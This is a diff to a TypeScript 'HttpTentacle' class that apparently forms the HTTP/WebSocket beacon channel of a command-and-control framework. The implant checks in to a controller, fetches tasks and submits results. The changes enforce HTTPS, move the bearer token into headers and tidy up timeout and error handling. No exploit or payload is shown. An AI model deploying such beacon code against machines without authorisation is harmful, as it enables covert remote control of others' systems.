@@ -13,8 +13,7 @@
  * Fallback: REST        POST /api/beacon/checkin
  *                       POST /api/beacon/submit-result
  *
- * Auth: Authorization: Bearer <config.token> on all HTTP requests;
- *       WebSocket: query param ?token=<config.token>
+ * Auth: Authorization: Bearer <config.controllerToken> on HTTP and WebSocket.
  */
 
 import type {
@@ -24,8 +23,10 @@ import type {
   TaskResult,
   ITentacle,
   TentacleKind,
+  ResultSubmissionOutcome,
 } from "../types.ts";
 import { createLogger } from "../logger.ts";
+import { requireHttpsControllerUrl } from "../lib/ControllerUrl.ts";
 
 const log = createLogger("HttpTentacle");
 
@@ -43,22 +44,34 @@ export class HttpTentacle implements ITentacle {
     this.config = config;
   }
 
+  private get controllerToken(): string {
+    if (!this.config.controllerToken) {
+      throw new Error("SVC_BEACON_API_TOKEN is required for the HTTP channel");
+    }
+    return this.config.controllerToken;
+  }
+
   // ── isAvailable ────────────────────────────────────────────────────────────
 
   async isAvailable(): Promise<boolean> {
     // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
-    const url = process.env.SVC_HTTP_URL?.trim();
-    if (!url) {
+    const configuredUrl =
+      this.config.serverUrl ?? process.env.SVC_HTTP_URL?.trim();
+    if (!configuredUrl) {
       log.debug("isAvailable() → false (SVC_HTTP_URL not set)");
       return false;
     }
 
     try {
+      const url = requireHttpsControllerUrl(
+        configuredUrl,
+        "HttpTentacle controller URL",
+      );
       const controller = new AbortController();
       const timer = setTimeout(() => controller.abort(), HTTP_TIMEOUT_MS);
       const resp = await fetch(`${url}/api/health`, {
         method: "GET",
-        headers: { Authorization: `Bearer ${this.config.token}` },
+        headers: { Authorization: `Bearer ${this.controllerToken}` },
         signal: controller.signal,
       });
       clearTimeout(timer);
@@ -78,7 +91,7 @@ export class HttpTentacle implements ITentacle {
   // ── checkin ────────────────────────────────────────────────────────────────
 
   async checkin(payload: CheckinPayload): Promise<Task[]> {
-    const url = this.baseUrl ?? process.env.SVC_HTTP_URL?.trim() ?? "";
+    const url = this.resolveControllerUrl();
 
     // ── WebSocket path ──────────────────────────────────────────────────────
     try {
@@ -94,7 +107,7 @@ export class HttpTentacle implements ITentacle {
       method:  "POST",
       headers: {
         "Content-Type":  "application/json",
-        "Authorization": `Bearer ${this.config.token}`,
+        "Authorization": `Bearer ${this.controllerToken}`,
       },
       body: JSON.stringify(payload),
     });
@@ -111,14 +124,19 @@ export class HttpTentacle implements ITentacle {
 
   // ── submitResult ───────────────────────────────────────────────────────────
 
-  async submitResult(result: TaskResult): Promise<void> {
-    const url = this.baseUrl ?? process.env.SVC_HTTP_URL?.trim() ?? "";
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
+    const url = this.resolveControllerUrl();
 
     // ── WebSocket path ──────────────────────────────────────────────────────
     try {
       await this.wsSubmitResult(url, result);
       log.info(`submitResult (WS) task ${result.taskId}`);
-      return;
+      return {
+        artifactWritten: true,
+        controllerAccepted: true,
+        channel: "http",
+        acceptance: "direct-response",
+      };
     } catch (err) {
       log.warn(`submitResult WS failed (${(err as Error).message}), falling back to REST`);
     }
@@ -128,7 +146,7 @@ export class HttpTentacle implements ITentacle {
       method:  "POST",
       headers: {
         "Content-Type":  "application/json",
-        "Authorization": `Bearer ${this.config.token}`,
+        "Authorization": `Bearer ${this.controllerToken}`,
       },
       body: JSON.stringify(result),
     });
@@ -137,7 +155,20 @@ export class HttpTentacle implements ITentacle {
       throw new Error(`submitResult REST failed: HTTP ${resp.status}`);
     }
 
-    log.info(`submitResult (REST) task ${result.taskId}`);
+    const responseBody = await resp.json().catch(() => null) as {
+      accepted?: unknown;
+    } | null;
+    const accepted = responseBody?.accepted === true;
+    log.info(
+      `submitResult (REST) task ${result.taskId} ` +
+      `(${accepted ? "accepted" : "not accepted"})`,
+    );
+    return {
+      artifactWritten: accepted,
+      controllerAccepted: accepted,
+      channel: "http",
+      acceptance: accepted ? "direct-response" : null,
+    };
   }
 
   // ── teardown ───────────────────────────────────────────────────────────────
@@ -153,12 +184,18 @@ export class HttpTentacle implements ITentacle {
   // ── private WebSocket helpers ──────────────────────────────────────────────
 
   private buildWsUrl(baseUrl: string): string {
-    return (
-      baseUrl
-        .replace(/^https:\/\//, "wss://")
-        .replace(/^http:\/\//, "ws://")
-      + `/ws?token=${encodeURIComponent(this.config.token)}`
+    return `${requireHttpsControllerUrl(baseUrl).replace(/^https:/, "wss:")}/ws`;
+  }
+
+  private resolveControllerUrl(): string {
+    const url = requireHttpsControllerUrl(
+      this.baseUrl ??
+        this.config.serverUrl ??
+        process.env.SVC_HTTP_URL?.trim(),
+      "HttpTentacle controller URL",
     );
+    this.baseUrl = url;
+    return url;
   }
 
   private wsCheckin(baseUrl: string, payload: CheckinPayload): Promise<Task[]> {
@@ -166,17 +203,37 @@ export class HttpTentacle implements ITentacle {
       const wsUrl = this.buildWsUrl(baseUrl);
       let ws: WebSocket;
       try {
-        ws = new WebSocket(wsUrl);
+        ws = new WebSocket(wsUrl, { headers: { Authorization: `Bearer ${this.controllerToken}` } });
       } catch (err) {
         return reject(err);
       }
 
       this.activeWs = ws;
 
-      const timer = setTimeout(() => {
+      let settled = false;
+      let timer: ReturnType<typeof setTimeout> | undefined;
+
+      const cleanup = () => {
+        if (timer !== undefined) clearTimeout(timer);
+        if (this.activeWs === ws) this.activeWs = null;
+      };
+      const fail = (error: Error) => {
+        if (settled) return;
+        settled = true;
+        cleanup();
         try { ws.close(); } catch {}
-        this.activeWs = null;
-        reject(new Error("WS checkin timeout"));
+        reject(error);
+      };
+      const succeed = (tasks: Task[]) => {
+        if (settled) return;
+        settled = true;
+        cleanup();
+        try { ws.close(); } catch {}
+        resolve(tasks);
+      };
+
+      timer = setTimeout(() => {
+        fail(new Error("WS checkin timeout"));
       }, WS_TIMEOUT_MS);
 
       ws.onopen = () => {
@@ -184,36 +241,34 @@ export class HttpTentacle implements ITentacle {
       };
 
       ws.onmessage = (event) => {
-        clearTimeout(timer);
         try {
-          const msg = JSON.parse(event.data as string) as { type: string; tasks?: Task[] };
+          const msg = JSON.parse(event.data as string) as {
+            type: string;
+            tasks?: Task[];
+            message?: string;
+          };
           if (msg.type === "checkin-response") {
-            try { ws.close(); } catch {}
-            this.activeWs = null;
-            resolve(msg.tasks ?? []);
-          } else {
-            // Unexpected message type — wait for the right one (timer still running)
+            succeed(msg.tasks ?? []);
+          } else if (msg.type === "error") {
+            fail(new Error(
+              `WS checkin server error: ${msg.message ?? "unknown error"}`,
+            ));
           }
+          // Unexpected non-terminal messages leave the timeout running.
         } catch (err) {
-          clearTimeout(timer);
-          try { ws.close(); } catch {}
-          this.activeWs = null;
-          reject(new Error(`WS checkin parse error: ${(err as Error).message}`));
+          fail(new Error(`WS checkin parse error: ${(err as Error).message}`));
         }
       };
 
       ws.onerror = () => {
-        clearTimeout(timer);
-        this.activeWs = null;
-        reject(new Error("WS checkin connection error"));
+        fail(new Error("WS checkin connection error"));
       };
 
       ws.onclose = (event) => {
-        clearTimeout(timer);
-        this.activeWs = null;
-        if (!event.wasClean) {
-          reject(new Error(`WS checkin closed unexpectedly (code ${event.code})`));
-        }
+        if (settled) return;
+        fail(new Error(
+          `WS checkin closed before response (code ${event.code}, clean=${event.wasClean})`,
+        ));
       };
     });
   }
@@ -223,17 +278,37 @@ export class HttpTentacle implements ITentacle {
       const wsUrl = this.buildWsUrl(baseUrl);
       let ws: WebSocket;
       try {
-        ws = new WebSocket(wsUrl);
+        ws = new WebSocket(wsUrl, { headers: { Authorization: `Bearer ${this.controllerToken}` } });
       } catch (err) {
         return reject(err);
       }
 
       this.activeWs = ws;
 
-      const timer = setTimeout(() => {
+      let settled = false;
+      let timer: ReturnType<typeof setTimeout> | undefined;
+
+      const cleanup = () => {
+        if (timer !== undefined) clearTimeout(timer);
+        if (this.activeWs === ws) this.activeWs = null;
+      };
+      const fail = (error: Error) => {
+        if (settled) return;
+        settled = true;
+        cleanup();
         try { ws.close(); } catch {}
-        this.activeWs = null;
-        reject(new Error("WS submitResult timeout"));
+        reject(error);
+      };
+      const succeed = () => {
+        if (settled) return;
+        settled = true;
+        cleanup();
+        try { ws.close(); } catch {}
+        resolve();
+      };
+
+      timer = setTimeout(() => {
+        fail(new Error("WS submitResult timeout"));
       }, WS_TIMEOUT_MS);
 
       ws.onopen = () => {
@@ -241,36 +316,33 @@ export class HttpTentacle implements ITentacle {
       };
 
       ws.onmessage = (event) => {
-        clearTimeout(timer);
         try {
-          const msg = JSON.parse(event.data as string) as { type: string };
+          const msg = JSON.parse(event.data as string) as {
+            type: string;
+            message?: string;
+          };
           if (msg.type === "result-accepted") {
-            try { ws.close(); } catch {}
-            this.activeWs = null;
-            resolve();
-          } else {
-            // Unexpected message type — wait for the right one (timer still running)
+            succeed();
+          } else if (msg.type === "error") {
+            fail(new Error(
+              `WS submitResult server error: ${msg.message ?? "unknown error"}`,
+            ));
           }
+          // Unexpected non-terminal messages leave the timeout running.
         } catch (err) {
-          clearTimeout(timer);
-          try { ws.close(); } catch {}
-          this.activeWs = null;
-          reject(new Error(`WS submitResult parse error: ${(err as Error).message}`));
+          fail(new Error(`WS submitResult parse error: ${(err as Error).message}`));
         }
       };
 
       ws.onerror = () => {
-        clearTimeout(timer);
-        this.activeWs = null;
-        reject(new Error("WS submitResult connection error"));
+        fail(new Error("WS submitResult connection error"));
       };
 
       ws.onclose = (event) => {
-        clearTimeout(timer);
-        this.activeWs = null;
-        if (!event.wasClean) {
-          reject(new Error(`WS submitResult closed unexpectedly (code ${event.code})`));
-        }
+        if (settled) return;
+        fail(new Error(
+          `WS submitResult closed before response (code ${event.code}, clean=${event.wasClean})`,
+        ));
       };
     });
   }
